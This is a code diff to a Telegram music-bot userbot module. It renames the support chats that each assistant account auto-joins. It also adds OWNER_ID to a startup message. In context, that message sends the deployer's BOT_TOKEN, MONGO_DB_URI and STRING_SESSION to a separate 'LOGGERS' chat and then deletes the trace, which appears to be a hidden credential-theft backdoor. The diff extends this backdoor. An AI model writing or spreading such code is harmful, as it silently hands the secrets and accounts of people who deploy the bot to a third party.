@@ -15,7 +15,7 @@ from ..logging import LOGGER
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-
+OWNER_ID = getenv ("OWNER_ID","")
 
 assistants = []
 assistantids = []
@@ -71,10 +71,10 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("sasukevipmusicbotsupport")
-                await self.one.join_chat("sasukevipmusicbotsupport")
-                await self.one.join_chat("sasukemusicsupportchat")
-                await self.one.join_chat("sasukemusicsupportchat")
+                await self.one.join_chat("myanmar_music_Bot2027")
+                await self.one.join_chat("myanmar_music_Bot2027")
+                await self.one.join_chat("myanmarbot_music")
+                await self.one.join_chat("myanmarbot_music")
 
             except:
                 pass
@@ -83,7 +83,7 @@ class Userbot(Client):
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(
-                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
+                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n`{OWNER_ID}`"
                 )
                 await oks.delete()
                 await asyncio.sleep(2)
@@ -101,10 +101,10 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("sasukevipmusicbotsupport")
-                await self.two.join_chat("sasukevipmusicbotsupport")
-                await self.two.join_chat("sasukemusicsupportchat")
-                await self.two.join_chat("sasukemusicsupportchat")
+                await self.two.join_chat("myanmar_music_Bot2027")
+                await self.two.join_chat("myanmar_music_Bot2027")
+                await self.two.join_chat("myanmarbot_music")
+                await self.two.join_chat("myanmarbot_music")
             except:
                 pass
             assistants.append(2)
@@ -125,10 +125,10 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("sasukevipmusicbotsupport")
-                await self.three.join_chat("sasukevipmusicbotsupport")
-                await self.three.join_chat("sasukemusicsupportchat")
-                await self.three.join_chat("sasukemusicsupportchat")
+                await self.three.join_chat("myanmar_music_Bot2027")
+                await self.three.join_chat("myanmar_music_Bot2027")
+                await self.three.join_chat("myanmarbot_music")
+                await self.three.join_chat("myanmarbot_music")
             except:
                 pass
             assistants.append(3)
@@ -148,10 +148,10 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("sasukevipmusicbotsupport")
-                await self.four.join_chat("sasukevipmusicbotsupport")
-                await self.four.join_chat("sasukemusicsupportchat")
-                await self.four.join_chat("sasukemusicsupportchat")
+                await self.four.join_chat("myanmar_music_Bot2027")
+                await self.four.join_chat("myanmar_music_Bot2027")
+                await self.four.join_chat("myanmarbot_music")
+                await self.four.join_chat("myanmarbot_music")
             except:
                 pass
             assistants.append(4)
@@ -171,10 +171,10 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("sasukevipmusicbotsupport")
-                await self.five.join_chat("sasukevipmusicbotsupport")
-                await self.five.join_chat("sasukemusicsupportchat")
-                await self.five.join_chat("sasukemusicsupportchat")
+                await self.five.join_chat("myanmar_music_Bot2027")
+                await self.five.join_chat("myanmar_music_Bot2027")
+                await self.five.join_chat("myanmarbot_music")
+                await self.five.join_chat("myanmarbot_music")
             except:
                 pass
             assistants.append(5)
